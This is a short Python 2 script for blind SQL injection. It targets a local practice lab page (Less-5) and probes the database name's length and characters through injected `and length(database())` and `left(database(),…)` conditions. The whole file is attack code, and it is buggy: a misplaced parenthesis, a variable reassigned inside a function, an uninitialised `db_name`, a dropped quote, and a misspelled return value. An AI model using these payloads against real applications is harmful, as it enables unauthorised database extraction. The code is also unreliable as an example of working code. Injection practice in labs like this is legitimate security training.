#coding=utf-8

import requests

url = 'http://localhost/SQLdemo2/Less-5/?id=1'

db_length =0
def getDbLength():
	for i in range(30):
		payload = "' and length(database()=%d--+)"%i
		url = url+payload
		req = requests.get(url)
		if "key" in req.content:
			db_length = i
			print "this db length is %d"%db_length
	return db_length
def getDbName():
	for i in range(db_length):
		for j in range(95,200):
			payload = " and left(database(),%d)=%s--+"%(i,db_name+chr(j))
			req = requests.get(url+payload)
			if "key" in req.content:
				db_name+=chr(j)
	print "db_name:",db_name
	return db_sname

